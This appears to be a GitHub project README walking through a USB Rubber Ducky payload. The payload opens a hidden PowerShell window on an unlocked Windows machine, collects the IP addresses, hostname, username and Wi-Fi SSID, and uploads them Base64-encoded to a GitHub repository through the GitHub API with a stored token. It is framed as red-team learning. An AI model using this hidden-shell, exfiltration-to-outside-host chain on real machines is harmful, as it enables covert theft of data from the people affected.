<h1>Keylogger Payload Project Walkthrough</h1>


<h2>Description</h2>
This Rubber Ducky payload is designed to silently collect key network information from a Windows machine, including the public IP address, local IP address, network adapter configuration, and Wi-Fi SSID. The data is stored locally or optionally exfiltrated for analysis. This script demonstrates how attackers or red teamers could leverage physical access to quickly extract network intel from a target system.
<br />


<h2>Languages and Utilities Used</h2>

- <b>USB Rubber Ducky</b>
- <b>PowerShell</b> 
- <b>Ducky Script</b>
- <b>Payload Studio</b>
- <b>ifconfig.me</b>
- <b>GitHub API</b>

<h2>Objectives</h2>

- <b>To simulate how a malicious USB HID device can gather and store or transmit network-related data from a compromised machine within seconds of being plugged in.</b> 

<h2>Program walk-through:</h2>

<p align="center">
Payload Begins:
 
 
 The Digispark is inserted into an unlocked Windows machine.<br/>

 It initiates with a short delay (`DELAY 200`) before opening the Run dialog using `GUI r`.
 
<img src="https://i.imgur.com/62TgaWL.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<p align="center">
Powershell Launch:
 
 A hidden PowerShell window is opened with: `powershell -WindowStyle hidden`<br/>


<img src="https://i.imgur.com/tcTyMUE.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />

<p align="center">
Information Collection:
 
 The payload gathers:  
   - **IPv4**: `http://ipv4.icanhazip.com`  
   - **IPv6**: `http://ifconfig.me/ip`  
   - **Hostname**: `hostname`  
   - **Username**: `$env:USERNAME`  
   - **Wi-Fi SSID**: Extracted from `netsh wlan show interfaces`<br/>

<img src="https://i.imgur.com/nCIbXbg.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<p align="center">
Data Encoding:
 
 The collected data is formatted into a log string, converted to UTF-8 bytes, then Base64-encoded for GitHub upload.<br/>
 
<img src="https://i.imgur.com/cdFHBiU.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<p align="center">
GitHub API Setup:
 
 A personal access token is stored in `$token`, and authorization headers are created using:

PowerShell: 
`$headers = @{ Authorization = "token $token" }`

<img src="https://i.imgur.com/JL945Ga.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<p align="center">
Dynamic Filename Generation:
 
A timestamped filename is created:

`$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"`

`$filename = "iplog-$timestamp.txt"` <br/>

<img src="https://i.imgur.com/K71yaM2.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<p align="center">
REST API Upload:
 
The payload uploads the Base64-encoded log file to your GitHub repository using the following URI format:

`$uri = "https://api.github.com/repos/VemTech6/temp-ducky/contents/" + $filename`

`Invoke-RestMethod -Uri $uri -Method PUT -Headers $headers -Body $body <br/>`

<img src="https://i.imgur.com/AeZkvFQ.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
</p>

<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>
